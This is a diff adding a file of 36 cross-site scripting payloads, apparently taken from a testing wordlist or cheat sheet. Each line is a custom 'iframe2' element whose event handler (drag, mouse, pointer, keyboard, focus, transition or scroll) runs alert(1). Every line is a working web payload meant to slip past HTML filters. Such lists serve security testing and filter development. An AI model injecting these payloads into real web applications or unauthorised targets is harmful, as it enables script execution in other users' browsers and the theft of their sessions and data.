@@ -1,0 +1,36 @@
+<iframe2 contenteditable onbeforeinput=alert(1)>test
+<iframe2 draggable="true" ondrag="alert(1)" style=display:block>test</iframe2>
+<iframe2 draggable="true" ondragend="alert(1)" style=display:block>test</iframe2>
+<iframe2 draggable="true" ondragenter="alert(1)" style=display:block>test</iframe2>
+<iframe2 draggable="true" ondragleave="alert(1)" style=display:block>test</iframe2>
+<iframe2 draggable="true" ondragstart="alert(1)" style=display:block>test</iframe2>
+<iframe2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></iframe2>
+<iframe2 onafterscriptexecute=alert(1)><script>1</script>
+<iframe2 onbeforescriptexecute=alert(1)><script>1</script>
+<iframe2 onblur=alert(1) id=x tabindex=1 style=display:block>test</iframe2><input value=clickme>
+<iframe2 onclick="alert(1)" style=display:block>test</iframe2>
+<iframe2 oncontextmenu="alert(1)" style=display:block>test</iframe2>
+<iframe2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<iframe2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<iframe2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</iframe2>
+<iframe2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</iframe2><input value=clickme>
+<iframe2 onkeydown="alert(1)" contenteditable style=display:block>test</iframe2>
+<iframe2 onkeypress="alert(1)" contenteditable style=display:block>test</iframe2>
+<iframe2 onkeyup="alert(1)" contenteditable style=display:block>test</iframe2>
+<iframe2 onmousedown="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmouseenter="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmouseleave="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmousemove="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmouseout="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmouseover="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmouseup="alert(1)" style=display:block>test</iframe2>
+<iframe2 onmousewheel=alert(1) style=display:block>requires scrolling
+<iframe2 onpointerdown=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointerenter=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointerleave=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointermove=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointerout=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointerover=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointerrawupdate=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onpointerup=alert(1) style=display:block>XSS</iframe2>
+<iframe2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></iframe2>
